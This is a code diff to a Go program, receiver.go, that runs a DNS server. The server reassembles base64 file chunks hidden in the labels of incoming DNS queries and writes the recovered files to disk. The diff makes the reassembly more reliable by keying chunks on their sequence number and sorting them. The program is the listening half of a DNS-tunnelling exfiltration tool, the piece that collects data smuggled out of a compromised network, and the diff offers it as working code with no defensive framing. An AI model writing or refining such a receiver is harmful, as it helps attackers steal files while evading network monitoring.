@@ -1,4 +1,4 @@
-// receiver.go (updated with ordering)
+// receiver.go (final)
 package main
 
 import (
@@ -18,7 +18,7 @@ type chunk struct {
 }
 
 var (
-    dataStore = make(map[string][]chunk)
+    dataStore = make(map[string]map[int]string)
     mutex     = &sync.Mutex{}
 )
 
@@ -39,11 +39,14 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
             labels := parts[:len(parts)-2]
 
             mutex.Lock()
+            if _, ok := dataStore[filename]; !ok {
+                dataStore[filename] = make(map[int]string)
+            }
+
             for _, label := range labels {
                 if len(label) < 4 {
-                    continue // skip invalid entries
+                    continue
                 }
-
                 seqStr := label[:4]
                 data := label[4:]
 
@@ -52,7 +55,7 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
                     continue
                 }
 
-                dataStore[filename] = append(dataStore[filename], chunk{seq, data})
+                dataStore[filename][seq] = data
             }
             mutex.Unlock()
 
@@ -67,20 +70,19 @@ func saveFiles() {
     mutex.Lock()
     defer mutex.Unlock()
 
-    for filename, chunks := range dataStore {
-        // Sort by sequence number
-        sort.Slice(chunks, func(i, j int) bool {
-            return chunks[i].seq < chunks[j].seq
-        })
+    for filename, chunkMap := range dataStore {
+        var keys []int
+        for k := range chunkMap {
+            keys = append(keys, k)
+        }
+        sort.Ints(keys)
 
-        var fullData strings.Builder
-        for _, c := range chunks {
-            fullData.WriteString(c.data)
+        var b64Builder strings.Builder
+        for _, k := range keys {
+            b64Builder.WriteString(chunkMap[k])
         }
 
-        b64 := fullData.String()
-
-        // Ensure proper padding
+        b64 := b64Builder.String()
         if pad := len(b64) % 4; pad != 0 {
             b64 += strings.Repeat("=", 4-pad)
         }
@@ -95,7 +97,7 @@ func saveFiles() {
         if err != nil {
             fmt.Printf("[-] Failed to write file %s: %s\n", filename, err)
         } else {
-            fmt.Printf("[+] Successfully reconstructed file: %s\n", filename)
+            fmt.Printf("[+] Successfully reconstructed file: %s (%d bytes)\n", filename, len(decoded))
         }
     }
 }
